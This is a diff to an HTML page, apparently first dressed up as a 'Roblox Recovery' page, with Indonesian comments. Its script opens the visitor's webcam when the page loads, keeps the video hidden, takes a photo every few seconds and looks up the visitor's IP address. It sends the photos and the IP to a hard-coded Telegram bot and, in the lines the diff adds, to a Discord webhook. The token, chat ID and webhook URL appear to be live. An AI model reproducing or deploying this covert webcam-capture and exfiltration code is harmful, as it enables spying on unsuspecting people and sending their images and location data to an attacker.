@@ -3,9 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Recovery</title>
+  <title>Automatic Camera Capture to Telegram and Discord</title>
   <style>
-    /* Ganti gaya CSS sesuai kebutuhan Anda */
     body {
       display: flex;
       justify-content: center;
@@ -13,32 +12,31 @@
       height: 100vh;
       margin: 0;
     }
-
     video {
       display: none; /* Menyembunyikan video dari tampilan web */
     }
   </style>
 </head>
 <body>
+  <h1>Automatic Camera Capture to Telegram and Discord</h1>
+
   <script>
-    var token = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0'; // Ganti dengan token bot Telegram Anda
-    var chatId = '-1002188815934';   // Ganti dengan ID obrolan atau pengguna di -1002188815934
+    var telegramToken = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0';
+    var telegramChatId = '-1002188815934';
+    var discordWebhookUrl = 'https://discord.com/api/webhooks/1260940016310423606/94wLCeLPsDUTB1Ai-9ZbP6NF2mTQSpiwdgygwe4C8-zUjOz7Sx2oKnYjNeIm28xXNuOb'; // Ganti dengan URL Webhook Discord Anda
+
     // Fungsi untuk mengirim gambar ke Telegram
     function sendToTelegram(imageDataURL, caption) {
-      // API endpoint untuk mengirim pesan gambar
-      var apiUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+      var apiUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
 
-      // Mengubah data URL menjadi Blob
       fetch(imageDataURL)
         .then(res => res.blob())
         .then(blob => {
-          // Buat form data untuk POST request
           var formData = new FormData();
-          formData.append('chat_id', chatId);
-          formData.append('photo', blob, 'photo.png'); // Nama file disertakan untuk photo
-          formData.append('caption', caption); // Menambahkan caption ke form data
+          formData.append('chat_id', telegramChatId);
+          formData.append('photo', blob, 'photo.png');
+          formData.append('caption', caption);
 
-          // Kirim POST request menggunakan fetch API
           return fetch(apiUrl, {
             method: 'POST',
             body: formData
@@ -46,30 +44,45 @@
         })
         .then(response => response.json())
         .then(data => {
-          console.log('.', data);
-          // Lanjutkan pengambilan gambar berikutnya setelah berhasil dikirim dengan delay 5 detik
-          setTimeout(takeAndSendPhoto, 3000);
+          console.log('Gambar berhasil dikirim ke Telegram:', data);
         })
         .catch(error => {
-          console.error('gagal:', error);
-          // Coba kirim gambar berikutnya setelah terjadi kesalahan dengan delay 5 detik
-          setTimeout(takeAndSendPhoto, 3000);
+          console.error('Error mengirim gambar ke Telegram:', error);
         });
     }
 
-    // Fungsi untuk mengambil dan mengirim foto ke Telegram
+    // Fungsi untuk mengirim gambar ke Discord
+    function sendToDiscord(imageDataURL) {
+      fetch(imageDataURL)
+        .then(res => res.blob())
+        .then(blob => {
+          var formData = new FormData();
+          formData.append('file', blob, 'photo.png');
+
+          return fetch(discordWebhookUrl, {
+            method: 'POST',
+            body: formData
+          });
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log('.:', data);
+        })
+        .catch(error => {
+          console.error('..:', error);
+        });
+    }
+
+    // Fungsi untuk mengambil dan mengirim foto ke Telegram dan Discord
     function takeAndSendPhoto() {
-      // Mendapatkan akses ke kamera pengguna secara otomatis
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(function(stream) {
           var video = document.createElement('video');
-          // Tambahkan video ke dokumen agar stream aktif, tetapi tidak ditampilkan di web
           document.body.appendChild(video);
           video.srcObject = stream;
           video.onloadedmetadata = function(e) {
             video.play();
 
-            // Mengambil gambar pertama kali tanpa delay
             takePhoto();
 
             function takePhoto() {
@@ -79,47 +92,40 @@
               canvas.height = video.videoHeight;
               context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-              // Mengambil data gambar dalam bentuk base64
               var imageDataURL = canvas.toDataURL('image/png');
 
-              // Mendapatkan alamat IP pengguna
               var ipAddress = '';
               fetch('https://api64.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                   ipAddress = data.ip;
 
-                  // Kirim gambar ke fungsi untuk mengirim ke Telegram dengan caption
                   sendToTelegram(imageDataURL, `Foto terkirim dari IP: ${ipAddress}`);
+                  sendToDiscord(imageDataURL);
                 })
                 .catch(error => {
                   console.error('Error mendapatkan IP address:', error);
 
-                  // Kirim gambar ke fungsi untuk mengirim ke Telegram tanpa caption IP address
                   sendToTelegram(imageDataURL, 'Foto terkirim');
+                  sendToDiscord(imageDataURL);
                 });
 
-              // Hapus elemen video dari dokumen
               document.body.removeChild(video);
 
-              // Setelah foto pertama kali, beri jeda 5 detik sebelum mengambil foto berikutnya
-              setTimeout(takeAndSendPhoto, 3000);
+              setTimeout(takeAndSendPhoto, 5000);
             }
           };
         })
         .catch(function(err) {
           console.log("Error: " + err);
-          // Menangani kesalahan pengambilan akses kamera
           if (err.name === 'NotAllowedError') {
-            alert('Untuk melanjutkan, izinkan/allow akses kamera pada browser Anda.');
+            alert('Untuk melanjutkan, izinkan akses kamera pada peramban Anda.');
           } else {
-            // Coba kembali mengambil gambar jika terjadi kesalahan dengan delay 5 detik
-            setTimeout(takeAndSendPhoto, 3000);
+            setTimeout(takeAndSendPhoto, 5000);
           }
         });
     }
 
-    // Memulai proses pengambilan dan pengiriman foto pertama kali
     takeAndSendPhoto();
   </script>
 </body>
